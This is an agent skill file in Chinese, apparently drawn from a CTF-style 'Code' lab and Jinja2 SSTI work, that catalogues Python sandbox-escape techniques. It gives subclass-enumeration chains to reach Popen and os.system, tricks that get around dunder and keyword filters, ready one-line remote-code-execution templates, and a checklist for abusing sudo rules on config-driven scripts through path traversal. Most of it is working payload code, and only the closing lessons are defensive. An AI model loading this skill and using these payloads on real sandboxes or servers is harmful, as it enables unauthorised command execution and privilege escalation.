---
name: 'python-sandbox-escape'
description: 'Python 沙箱逃逸通用模式：subclass枚举、关键字bypass、sudo到config-consumer脚本的路径穿越。来源Code靶机+Jinja2 SSTI'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Python 沙箱逃逸通用模式

## 核心原理
String-based 关键字过滤永远是脆弱的——运行时内存中 dangerous objects 仍然可达。攻击者通过**对象图遍历**绕过语法层面的过滤。

## 1. Subclass Enumeration（子类枚举）

```python
# 起点：任意 Python 对象的类层级
().__class__               # <class 'tuple'>
().__class__.__base__       # <class 'object'>
().__class__.__mro__        # (<class 'tuple'>, <class 'object'>)

# 获取所有已加载的 object 子类
().__class__.__mro__[-1].__subclasses__()
# 或者：
().__class__.__base__.__subclasses__()
```

## 2. 找到 subprocess.Popen（或 os.system）

```python
# 遍历寻找 Popen
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if 'Popen' in c.__name__:
        print(i)   # 通常 317，但版本不同会变化

# 直接用索引（如果已知）
Popen = ().__class__.__mro__[-1].__subclasses__()[317]
Popen(['cmd', 'arg'])
```

### 常用目标类索引（Python 3.x）
| 类名 | 用途 | 典型索引 |
|------|------|---------|
| `subprocess.Popen` | 执行系统命令 | 250-400 |
| `os._wrap_close` | 访问 os 模块 | 120-150 |
| `warnings.catch_warnings` | `__init__.__globals__` 可达 builtins | ~80 |
| `BuiltinImporter` | 加载任意模块 | ~100 |

## 3. Bypass 技术（绕过关键字过滤）

### 3.1 禁用了 `__` (dunder)
```python
# getattr 方法
getattr((), getattr(getattr((), '__cla' + 'ss__'), '__mr' + 'o__'))[-1]

# Unicode normalization bypass
''.replace('\x5f\x5f', '')  # \x5f = '_'

# 拼接
getattr((), '_' + '_class_' + '_')
```

### 3.2 禁用了 import / os / subprocess / Popen
```python
# 永远不要写出 banned 标识符——用数字索引
# ❌ subprocess.Popen → 被过滤
# ✅ ().__class__...__subclasses__()[317]

# 如果索引不确定，运行时计算
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    name = c.__name__
    if name[0] == 'P' and len(name) == 5:  # Popen
        target = c
```

### 3.3 禁用了 `eval` / `exec` / `open`
```python
# 不用 eval——直接调 Popen
# 不用 open——用 subprocess(['cat', '/path/file'])
# 不用 exec——用 types.FunctionType(code, {})
```

## 4. 从 Popen 外的方法链

```python
# 通过 warnings.catch_warnings 拿 builtins
w = [c for c in ().__class__.__mro__[-1].__subclasses__() 
     if 'catch_warnings' in str(c)][0]
w.__init__.__globals__['__builtins__']['__import__']('os').system('id')

# 通过 os._wrap_close
os_wrap = ().__class__.__mro__[-1].__subclasses__()[135]
os_wrap.__init__.__globals__['system']('id')
```

## 5. 通用 RCE 模板（一句话）

```python
# 模板 A: 直接 Popen（需要找到索引）
[c for c in ().__class__.__mro__[-1].__subclasses__() if 'Popen' in c.__name__][0](['bash','-c','CMD'])

# 模板 B: 通过 builtins（更可靠）
().__class__.__mro__[-1].__subclasses__()[84].__init__.__globals__['sys'].modules['os'].system('CMD')

# 模板 C: 通过 subprocess 模块
().__class__.__mro__[-1].__subclasses__()[84].__init__.__globals__['sys'].modules['subprocess'].Popen('CMD',shell=True)
```

## 6. sudo + config-consumer 脚本 = 间接任意文件操作

来自 Code 靶机的 `sudo /usr/bin/backy.sh /root/backy.conf`：

```
模式: sudo <script> <config_file>
原理: config 中的路径字段（如 directories_to_archive）可能绕过验证
```

关键检查点：
- `..` 路径穿越：`/root/..//root/` 绕过 strip('/root')
- 软链接跟随
- config 中的 `destination` → 写文件到任意目录
- YAML/JSON config 的特殊值（`!!python/object` 等）

### 审计要点
```bash
# 有这类 sudo 规则时：
sudo -l
# (root) NOPASSWD: /usr/bin/backy.sh /root/backy.conf
# (root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *

# 检查：
# 1. config 中的 path 字段 → 路径穿越？
# 2. 脚本是否 trust 远程 URL？（setuptools download → CVE-2025-47273）
# 3. 脚本是否 eval() / exec() / system() 用户输入？
# 4. 脚本参数可控吗？
# 5. 环境变量影响脚本行为吗？
```

## 教训
- **Blocklist 过滤永远不安全**——用 allowlist 或真 sandbox（RestrictedPython, gVisor, seccomp）
- **运行时还在内存中的对象 = 可攻击面**——indexing, getattr, `__dict__` 都行
- **sudo 到脚本 + config = sudo 到 config 控制的任何东西**
- **`..` 路径穿越在 2026 年仍然有效**
